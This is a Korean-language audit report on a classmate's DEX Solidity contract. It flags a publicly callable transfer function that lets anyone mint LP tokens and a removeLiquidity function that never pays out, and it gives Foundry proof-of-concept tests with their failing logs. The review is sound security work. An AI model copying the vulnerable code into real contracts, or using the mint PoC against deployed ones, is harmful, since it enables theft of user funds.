# 김한기

## public transfer
#### Dex.sol:transfer:159
**************critical (파급력: high, 공격 난이도: low)**************

```solidity
function transfer(address to, uint256 lpAmount) external returns (bool) {
        require(lpAmount > 0);

        lpt.mint(payable(address(this)), lpAmount);
        lpt.transfer(payable(to), lpAmount);

        return true;
    }
```

한기님 같은 경우에는 ERC20을 상속받지 않고 lpt토큰을 따로 유지하신다. LPT token의 owner가 DEX이고 mint는 owner밖에 할 수 없지만 transfer가 public으로 선언되어 잇는 상황에서 mint를 아무나 할 수 있게 된다.

#### PoC

```solidity
function testTransferVisibility() external {
        vm.startPrank(user1);
        dex.transfer(address(this), 1000 ether);
        
        (address lptaddr, address oracleaddr) = dex.getInfo();
        ERC20 lpt = ERC20(lptaddr);
        
        uint amount = lpt.balanceOf(address(this));
        console.log("%d", amount);
        amount = lpt.totalSupply();
        console.log("%d", amount);
        vm.stopPrank();
        assertTrue(!(amount == 1000 ether), "testTransferVisibility Error");
    }
```

```solidity
[FAIL. Reason: Assertion failed.] testTransferVisibility() (gas: 89969)
Logs:
  1000000000000000000000
  1000000000000000000000
  Error: testTransferVisibility Error
  Error: Assertion Failed
```

## removeLiquidity nothing happend
#### Dex.sol:removeLiquidity:138
******************************************************************************************************critical (파급력: critical, 공격난이도:???)******************************************************************************************************

```solidity
function removeLiquidity(
        uint256 LPTokenAmount,
        uint256 minimumTokenXAmount,
        uint256 minimumTokenYAmount
    ) external returns (uint rx, uint ry) {
        require(LPTokenAmount > 0);
        require(minimumTokenXAmount >= 0);
        require(minimumTokenYAmount >= 0);
        require(lpt.balanceOf(msg.sender) >= LPTokenAmount);

        (uint balanceOfX, uint balanceOfY) = pairTokenBalance();

        uint lptTotalSupply = lpt.totalSupply();

        rx = balanceOfX * LPTokenAmount / lptTotalSupply;
        ry = balanceOfY * LPTokenAmount / lptTotalSupply;

        require(rx >= minimumTokenXAmount);
        require(rx >= minimumTokenYAmount);
    }
```

removeLiquidity에 tokenX, tokenY를 보내주거나, LP토큰을 소각하는 과정이 없이, 얼마를 받을 수 있는지만 나와 있다.

이 기능이 없기 때문에 피해자는 해당 DEX에 유동성을 공급할 경우 공급한 유동성을 돌려받을 수 없다.

#### PoC

```solidity
function testIsRemoveLiquidityWork() external{
        uint pre_x = tokenX.balanceOf(address(this));
        uint pre_y = tokenY.balanceOf(address(this));
        (address lptaddr, address oracleaddr) = dex.getInfo();
        ERC20 lpt = ERC20(lptaddr);
        
        uint lp1 = dex.addLiquidity(1000 ether, 1000 ether, 0);
        (uint rx, uint ry) = dex.removeLiquidity(lp1, 0, 0);
        console.log("rx: %d", rx);
        console.log("ry: %d", ry);
        
        uint lp = lpt.balanceOf(address(this));
        console.log("lp: %d", lp);
        assertTrue(!(lp == lp1));
        
        uint post_x = tokenX.balanceOf(address(this));
        uint post_y = tokenY.balanceOf(address(this));
        console.log("pre_x: %d", pre_x);
        console.log("pre_y: %d", pre_y);
        console.log("post_x: %d", post_x);
        console.log("post_y: %d", post_y);
        assertTrue(pre_x == post_x);
        assertTrue(pre_y == post_y);
    }
```

```solidity
[FAIL. Reason: Assertion failed.] testIsRemoveLiquidityWork() (gas: 207774)
Logs:
  priceOfX: 1000
  rx: 1000000000000000000000
  ry: 1000000000000000000000
  lp: 1000000000000000000000000
  Error: Assertion Failed
  pre_x: 10000000000000000000000000
  pre_y: 10000000000000000000000000
  post_x: 9999000000000000000000000
  post_y: 9999000000000000000000000
  Error: Assertion Failed
  Error: Assertion Failed
```
